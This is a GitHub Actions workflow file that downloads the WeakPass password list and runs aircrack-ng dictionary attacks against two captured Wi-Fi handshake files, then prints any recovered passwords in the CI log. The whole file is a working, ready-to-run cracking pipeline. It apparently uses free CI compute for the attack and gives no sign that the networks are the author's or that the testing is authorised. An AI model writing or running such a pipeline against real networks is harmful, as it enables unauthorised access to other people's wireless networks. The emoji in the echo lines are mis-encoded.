name: Aircrack-ng WiFi Cracking

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  crack_handshake:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v3

      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y aircrack-ng p7zip-full

      - name: Download weakpass dictionary
        run: |
          echo "ğŸ“¥ Downloading WeakPass dictionary..."
          wget -q --show-progress https://download.weakpass.com/wordlists/2025/weakpass_4.merged.txt.7z
          echo "âœ… Download completed"

      - name: Extract weakpass dictionary
        run: |
          echo "ğŸ“¦ Extracting dictionary..."
          7z x weakpass_4.merged.txt.7z -o. -y
          echo "âœ… Extraction completed"
          ls -lh weakpass_4.merged.txt

      - name: Crack WiFi-01 handshake
        id: crack1
        continue-on-error: true
        run: |
          echo "ğŸ”“ Starting crack for hs/wifi-01.cap..."
          echo "Current progress and estimated time will be displayed below:"
          aircrack-ng -w weakpass_4.merged.txt hs/wifi-01.cap -l results_wifi01.txt
          echo "âœ… Completed"
          if [ -f results_wifi01.txt ]; then
            echo "ğŸ“Š WiFi-01 Results:"
            cat results_wifi01.txt
          fi

      - name: Crack WiFi-02 handshake
        id: crack2
        continue-on-error: true
        run: |
          echo "ğŸ”“ Starting crack for hs/wifi-02.cap..."
          echo "Current progress and estimated time will be displayed below:"
          aircrack-ng -w weakpass_4.merged.txt hs/wifi-02.cap -l results_wifi02.txt
          echo "âœ… Completed"
          if [ -f results_wifi02.txt ]; then
            echo "ğŸ“Š WiFi-02 Results:"
            cat results_wifi02.txt
          fi

      - name: Show final results
        if: always()
        run: |
          echo "ğŸ‰ ===== FINAL CRACKING RESULTS ====="
          echo ""
          echo "--- WiFi-01 Results ---"
          if [ -f results_wifi01.txt ]; then
            cat results_wifi01.txt
          else
            echo "âŒ Password not found for wifi-01.cap"
          fi
          echo ""
          echo "--- WiFi-02 Results ---"
          if [ -f results_wifi02.txt ]; then
            cat results_wifi02.txt
          else
            echo "âŒ Password not found for wifi-02.cap"
          fi
          echo ""
          echo "âœ¨ Cracking process finished"
